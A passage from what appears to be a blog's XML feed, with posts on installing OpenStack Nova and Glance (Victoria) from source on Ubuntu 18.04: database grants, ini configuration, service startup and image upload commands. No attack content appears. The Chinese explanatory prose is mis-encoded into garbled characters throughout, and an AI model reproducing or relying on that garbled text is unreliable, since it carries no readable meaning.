install -r requirements.txt</span><br><span class="line">pip install -r test-requirements.txt</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ tox ç”Ÿæˆé…ç½®æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tox -e genconfig</span><br></pre></td></tr></table></figure><p>æ‰‹åŠ¨åˆ›å»ºç›®å½•ï¼Œå°†é…ç½®æ–‡ä»¶æ‹·è´è¿‡å»ï¼Œpaste-ini æ–‡ä»¶ç”¨äºé…ç½® WSGI ç¨‹åº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line">sudo mkdir /etc/nova</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹·è´é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo cp etc/nova/nova.conf.sample /etc/nova/nova.conf</span><br><span class="line">sudo cp etc/nova/api-paste.ini /etc/nova/api-paste.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo vi /etc/nova/nova.conf</span><br></pre></td></tr></table></figure><p>åœ¨ç›¸åº”çš„å°èŠ‚æ·»åŠ é…ç½®ï¼ŒåŒæ ·ï¼Œæ²¡æœ‰å®‰è£… memcached æ‰€ä»¥å¯¹åº”çš„é…ç½®æ³¨é‡Šæ‰äº†</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[api_database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://nova:NOVA_DBPASS@<span class="number">127.0</span>.<span class="number">0.1</span>/nova_api</span><br><span class="line"></span><br><span class="line"><span class="section">[database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://nova:NOVA_DBPASS@<span class="number">127.0</span>.<span class="number">0.1</span>/nova</span><br><span class="line"></span><br><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="attr">transport_url</span> = rabbit://openstack:RABBIT_PASS@<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5672</span>/</span><br><span class="line"><span class="attr">my_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">[api]</span></span><br><span class="line"><span class="attr">auth_strategy</span> = keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">www_authenticate_uri</span> = http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span>/</span><br><span class="line"><span class="attr">auth_url</span> = http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span>/</span><br><span class="line"><span class="comment">#memcached_servers = 127.0.0.1:11211</span></span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = nova</span><br><span class="line"><span class="attr">password</span> = nova</span><br><span class="line"></span><br><span class="line"><span class="section">[vnc]</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">server_listen</span> = <span class="variable">$my_ip</span></span><br><span class="line"><span class="attr">server_proxyclient_address</span> = <span class="variable">$my_ip</span></span><br><span class="line"><span class="attr">novncproxy_base_url</span> = http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6080</span>/vnc_auto.html</span><br><span class="line"></span><br><span class="line"><span class="section">[glance]</span></span><br><span class="line"><span class="attr">api_servers</span> = http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9292</span></span><br><span class="line"></span><br><span class="line"><span class="section">[oslo_concurrency]</span></span><br><span class="line"><span class="attr">lock_path</span> = /var/lib/nova/tmp</span><br><span class="line"></span><br><span class="line"><span class="section">[placement]</span></span><br><span class="line"><span class="attr">region_name</span> = RegionOne</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">auth_url</span> = http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">username</span> = placement</span><br><span class="line"><span class="attr">password</span> = placement</span><br></pre></td></tr></table></figure><p>nova-novncproxy ä¾èµ– novnc ï¼Œç›´æ¥å…‹éš†åˆ°ç›¸åº”ç›®å½•ï¼Œè¯¥ç»„ä»¶ç”¨äºåè°ƒ nova-compute æœåŠ¡å’Œæ•°æ®åº“ä¹‹é—´çš„äº¤äº’ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git <span class="built_in">clone</span> https://github.com/novnc/noVNC.git /usr/share/novnc/</span><br></pre></td></tr></table></figure><p>å®‰è£… Nova</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>å¯ç”¨æœåŠ¡ nova-apiã€nova-schedulerã€nova-conductorã€nova-novncproxy ã€‚nova-novncproxy æ˜¯å¯é€‰çš„ï¼Œå®ƒç”¨äºåè°ƒ nova-compute æœåŠ¡å’Œæ•°æ®åº“ä¹‹é—´çš„äº¤äº’ã€‚</p><p><em>PSï¼šè¿™é‡Œä½¿ç”¨ .tox æ–‡ä»¶å¤¹ä¸‹çš„å·¥å…·ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼Œæœ€ç»ˆçš„ç»“æœæ˜¯å†™å…¥æ•°æ®åº“ï¼Œæ‰€ä»¥è¿™ä¸ªé—®é¢˜è¿˜æ˜¯æš‚æ—¶ä¸ç®¡</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¡«å……æ•°æ®åº“</span></span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf api_db sync</span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf cell_v2 map_cell0</span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf cell_v2 create_cell --name=cell1 --verbose</span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf db sync</span><br><span class="line">.tox/shared/bin/nova-manage --config-file /etc/nova/nova.conf cell_v2 list_cells</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ç”¨æœåŠ¡</span></span><br><span class="line">sudo nova-api --config-file=/etc/nova/nova.conf --config-file=/etc/nova/api-paste.ini --debug</span><br><span class="line">sudo nova-scheduler --config-file=/etc/nova/nova.conf --config-file=/etc/nova/api-paste.ini --debug</span><br><span class="line">sudo nova-conductor --config-file=/etc/nova/nova.conf --config-file=/etc/nova/api-paste.ini --debug</span><br><span class="line">sudo nova-novncproxy --config-file=/etc/nova/nova.conf --config-file=/etc/nova/api-paste.ini --debug</span><br></pre></td></tr></table></figure><h2 id="nova-compute"><a href="#nova-compute" class="headerlink" title="nova-compute"></a>nova-compute</h2><p>ç”±äºæœ¬åœ°æµ‹è¯•ç¯å¢ƒæ˜¯å•æœºï¼ˆUbuntu 18.04 è™šæ‹Ÿæœºï¼‰ï¼Œè€Œä¸”é€šå¸¸ nova-compute ä¸ä¼šè£…åœ¨æ§åˆ¶èŠ‚ç‚¹ä¸Šï¼Œå› æ­¤æ²¡æœ‰è¿›è¡Œé…ç½®ã€‚å› ä¸ºæ²¡æœ‰ä½¿ç”¨ nova-compute æ‰€ä»¥ nova-novncproxy å’Œ Placement éƒ½æ˜¯å¯é€‰çš„ï¼ˆåº”è¯¥ï¼‰ã€‚</p><p>è®¡ç®—èŠ‚ç‚¹ï¼Œå¯ç”¨ nova-compute</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è™šæ‹Ÿæœºç¡¬ä»¶åŠ é€Ÿï¼ˆ0 è¡¨ç¤ºä¸æ”¯æŒï¼Œéœ€è¦é…ç½® virt_type=qemuï¼‰</span></span><br><span class="line">egrep -c <span class="string">&#x27;(vmx|svm)&#x27;</span> /proc/cpuinfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ç”¨æœåŠ¡</span></span><br><span class="line">systemctl <span class="built_in">enable</span> libvirtd.service openstack-nova-compute.service</span><br><span class="line">systemctl start libvirtd.service openstack-nova-compute.service</span><br></pre></td></tr></table></figure><p>é…ç½®æ–‡ä»¶ /etc/nova/nova-compute.conf</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[libvirt]</span></span><br><span class="line"><span class="attr">virt_type</span> = qemu</span><br></pre></td></tr></table></figure><p>å¯ç”¨æœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nova-compute restart</span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•-1"><a href="#æµ‹è¯•-1" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>éªŒè¯æœåŠ¡æ­£å¸¸è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¯¢ API çŠ¶æ€</span></span><br><span class="line">nova-status upgrade check</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ OpenStack Client æ‰§è¡Œä¸è®¡ç®—æœåŠ¡æœ‰å…³çš„æ“ä½œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åŠ è½½ç¯å¢ƒå˜é‡</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—å‡ºè®¡ç®—æœåŠ¡</span></span><br><span class="line">openstack compute service list</span><br></pre></td></tr></table></figure><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><p><a href="https://docs.openstack.org/placement/latest/contributor/quick-dev.html">Quick Placement Development</a></p></li><li><p><a href="https://docs.openstack.org/placement/latest/install/install-ubuntu.html#configure-user-and-endpoints">Install and configure Placement for Ubuntu</a></p></li><li><p><a href="https://docs.openstack.org/placement/latest/install/verify.html">Verify Installation</a></p></li><li><p><a href="https://docs.openstack.org/nova/latest/install/controller-install-ubuntu.html">Install and configure controller node for Ubuntu</a></p></li><li><p><a href="https://docs.openstack.org/nova/latest/install/compute-install-ubuntu.html">Install and configure a compute node for Ubuntu</a></p></li><li><p><a href="https://docs.openstack.org/nova/latest/install/verify.html">Verify operation</a></p></li><li><p><a href="https://bugs.launchpad.net/fuel/+bug/1433894">novncproxy: code 404, message File not found</a></p></li></ul>]]></content>
    
    
    <summary type="html">è®°å½•éƒ¨ç½²æµç¨‹</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Ubuntu" scheme="https://jckling.github.io/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 18.04 æºç å®‰è£… Glance (Victoria)</title>
    <link href="https://jckling.github.io/2021/05/13/OpenStack/Ubuntu18.04%20%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%20Glance%20(Victoria)/"/>
    <id>https://jckling.github.io/2021/05/13/OpenStack/Ubuntu18.04%20%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%20Glance%20(Victoria)/</id>
    <published>2021-05-13T03:40:14.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h1><p>åœ¨æºç éƒ¨ç½² Keystone ä¹‹åï¼Œç»§ç»­è¿›è¡Œ Glance çš„éƒ¨ç½²ã€‚ç¯å¢ƒè®¾å®šå’Œ Keystone éƒ¨ç½²ç›¸å…³æ“ä½œè§ <a href="https://jckling.github.io/2021/05/13/OpenStack/Ubuntu18.04%20%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%20Keystone%20%28Victoria%29/">Ubuntu 18.04 æºç å®‰è£… Keystone (Victoria)</a> ã€‚</p><h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><h2 id="æ•°æ®åº“é…ç½®"><a href="#æ•°æ®åº“é…ç½®" class="headerlink" title="æ•°æ®åº“é…ç½®"></a>æ•°æ®åº“é…ç½®</h2><p>MySQL æ•°æ®åº“é…ç½®ï¼Œå¯†ç  mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿æ¥æ•°æ®åº“</span></span><br><span class="line">sudo mysql -u root -p</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»ºæ•°æ®åº“</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> glance;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»ºç”¨æˆ· glance</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> glance.* <span class="keyword">TO</span> <span class="string">&#x27;glance&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;GLANCE_DBPASS&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> glance.* <span class="keyword">TO</span> <span class="string">&#x27;glance&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;GLANCE_DBPASS&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ›å»ºå®Œæ¯•é€€å‡º</span></span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h2 id="èº«ä»½è®¤è¯å’Œ-API-é…ç½®"><a href="#èº«ä»½è®¤è¯å’Œ-API-é…ç½®" class="headerlink" title="èº«ä»½è®¤è¯å’Œ API é…ç½®"></a>èº«ä»½è®¤è¯å’Œ API é…ç½®</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºè„šæœ¬</span></span><br><span class="line">cat &lt;&lt;<span class="string">EOF&gt;&gt; admin-openrc</span></span><br><span class="line"><span class="string">export OS_USERNAME=admin</span></span><br><span class="line"><span class="string">export OS_PASSWORD=ADMIN_PASS</span></span><br><span class="line"><span class="string">export OS_PROJECT_NAME=admin</span></span><br><span class="line"><span class="string">export OS_USER_DOMAIN_NAME=Default</span></span><br><span class="line"><span class="string">export OS_PROJECT_DOMAIN_NAME=Default</span></span><br><span class="line"><span class="string">export OS_AUTH_URL=http://127.0.0.1:5000/v3</span></span><br><span class="line"><span class="string">export OS_IDENTITY_API_VERSION=3</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½ç¯å¢ƒå˜é‡</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºé¡¹ç›®</span></span><br><span class="line">openstack project create --domain default --description <span class="string">&quot;Service Project&quot;</span> service</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç”¨æˆ·ï¼Œè®¾ç½®å¯†ç ä¸º glance</span></span><br><span class="line">openstack user create --domain default --password-prompt glance</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†ç”¨æˆ·æ·»åŠ åˆ° admin è§’è‰²</span></span><br><span class="line">openstack role add --project service --user glance admin</span><br><span class="line"><span class="comment"># æ— è¾“å‡º</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºæœåŠ¡å®ä½“å’ŒæœåŠ¡ API ç«¯ç‚¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæœåŠ¡å®ä½“</span></span><br><span class="line">openstack service create --name glance --description <span class="string">&quot;OpenStack Image&quot;</span> image</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæœåŠ¡ API ç«¯ç‚¹ï¼ˆendpointï¼‰</span></span><br><span class="line">openstack endpoint create --region RegionOne image public http://127.0.0.1:9292</span><br><span class="line">openstack endpoint create --region RegionOne image internal http://127.0.0.1:9292</span><br><span class="line">openstack endpoint create --region RegionOne image admin http://127.0.0.1:9292</span><br></pre></td></tr></table></figure><h1 id="Glance-éƒ¨ç½²"><a href="#Glance-éƒ¨ç½²" class="headerlink" title="Glance éƒ¨ç½²"></a>Glance éƒ¨ç½²</h1><h2 id="å®‰è£…ä¾èµ–"><a href="#å®‰è£…ä¾èµ–" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h2><p>ä¸‹è½½ Glance æºç ï¼ŒæŒ‡å®š Victoria ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/glance.git --branch stable/victoria --single-branch</span><br></pre></td></tr></table></figure><p>è¿›å…¥ Glance ç›®å½•å®‰è£…ç›¸å…³ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿›å…¥ç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> glance</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">sudo apt install $(bindep -b) -y</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ pip å®‰è£…ç›¸å…³ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br><span class="line">pip install -r test-requirements.txt</span><br></pre></td></tr></table></figure><h2 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h2><p>ä½¿ç”¨ tox ç”Ÿæˆé…ç½®æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tox -e genconfig</span><br></pre></td></tr></table></figure><p>æ‰‹åŠ¨åˆ›å»ºç›®å½•ï¼Œå°†é…ç½®æ–‡ä»¶æ‹·è´è¿‡å»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºç›®å½•</span></span><br><span class="line">sudo mkdir /etc/glance</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹·è´é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo cp etc/glance-api.conf /etc/glance/glance-api.conf</span><br><span class="line">sudo cp etc/glance-api-paste.ini /etc/glance/glance-api-paste.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼–è¾‘é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo vim /etc/glance/glance-api.conf</span><br></pre></td></tr></table></figure><p>åœ¨ç›¸åº”çš„å°èŠ‚æ·»åŠ é…ç½®ï¼Œæ²¡æœ‰å®‰è£… memcached æ‰€ä»¥å¯¹åº”çš„é…ç½®æ³¨é‡Šæ‰äº†</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://glance:GLANCE_DBPASS@localhost/glance</span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">www_authenticate_uri</span>  = http://localhost:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">auth_url</span> = http://localhost:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = glance</span><br><span class="line"><span class="attr">password</span> = glance</span><br><span class="line"><span class="comment">#memcached_servers = localhost:11211</span></span><br><span class="line"></span><br><span class="line"><span class="section">[paste_deploy]</span></span><br><span class="line"><span class="attr">flavor</span> = keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[glance_store]</span></span><br><span class="line"><span class="attr">stores</span> = file,http</span><br><span class="line"><span class="attr">default_store</span> = file</span><br><span class="line"><span class="attr">filesystem_store_datadir</span> = /var/lib/glance/images/</span><br></pre></td></tr></table></figure><h2 id="å¯ç”¨æœåŠ¡"><a href="#å¯ç”¨æœåŠ¡" class="headerlink" title="å¯ç”¨æœåŠ¡"></a>å¯ç”¨æœåŠ¡</h2><p>å®‰è£… Glance</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>å¯ç”¨ Glance é•œåƒæœåŠ¡</p><p><em>PSï¼šè¿™é‡Œä½¿ç”¨ .tox æ–‡ä»¶å¤¹ä¸‹çš„å·¥å…·ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼Œåæ­£æœ€ç»ˆçš„ç»“æœæ˜¯å†™å…¥æ•°æ®åº“ï¼Œæ‰€ä»¥è¿™é‡Œçš„é—®é¢˜æš‚æ—¶ä¸ç®¡</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¡«å……æ•°æ®åº“</span></span><br><span class="line">.tox/genconfig/bin/glance-manage db_sync</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ç”¨æœåŠ¡ï¼ˆåå°ï¼‰</span></span><br><span class="line">sudo glance-api --config-file=/etc/glance/glance-api.conf --config-file=/etc/glance/glance-api-paste.ini &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug ç›´æ¥è¾“å‡º</span></span><br><span class="line">sudo glance-api --config-file=/etc/glance/glance-api.conf --config-file=/etc/glance/glance-api-paste.ini --debug</span><br></pre></td></tr></table></figure><h1 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h1><p>ä½¿ç”¨ OpenStack Client æ‰§è¡Œä¸€äº›å’Œé•œåƒæœ‰å…³çš„æ“ä½œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¾ç½®ç¯å¢ƒå˜é‡</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—å‡ºé•œåƒ</span></span><br><span class="line">openstack image list</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½æºé•œåƒ</span></span><br><span class="line">wget http://download.cirros-cloud.net/0.4.0/cirros-0.4.0-x86_64-disk.img</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸Šä¼ é•œåƒåˆ°é•œåƒæœåŠ¡ï¼Œå…¬å¼€å¯è§ï¼ˆæ‰€æœ‰é¡¹ç›®éƒ½å¯ä»¥è®¿é—®ï¼‰</span></span><br><span class="line">openstack image create <span class="string">&quot;cirros&quot;</span> \</span><br><span class="line">  --file cirros-0.4.0-x86_64-disk.img \</span><br><span class="line">  --disk-format qcow2 --container-format bare \</span><br><span class="line">  --public</span><br><span class="line">  </span><br><span class="line"><span class="comment"># åˆ—å‡ºé•œåƒ</span></span><br><span class="line">openstack image list</span><br></pre></td></tr></table></figure><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://docs.openstack.org/glance/latest/index.html">Glanceâ€™s documentation</a></li><li><a href="https://docs.openstack.org/glance/latest/install/">Glance Installation</a></li><li><a href="https://docs.openstack.org/glance/ocata/installing.html#installing-from-git">Installing from Git</a></li><li><a href="https://docs.rackspace.com/blog/install-openstack-from-source2/">Install OpenStack from source - part 2</a></li></ul>]]></content>
    
    
    <summary type="html">è®°å½•éƒ¨ç½²æµç¨‹</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Ubuntu" scheme="https://jckling.github.io/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 18.04 æºç å®‰è£… Keystone (Victoria)</title>
    <link href="https://jckling.github.io/2021/05/13/OpenStack/Ubuntu18.04%20%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%20Keystone%20(Victoria)/"/>
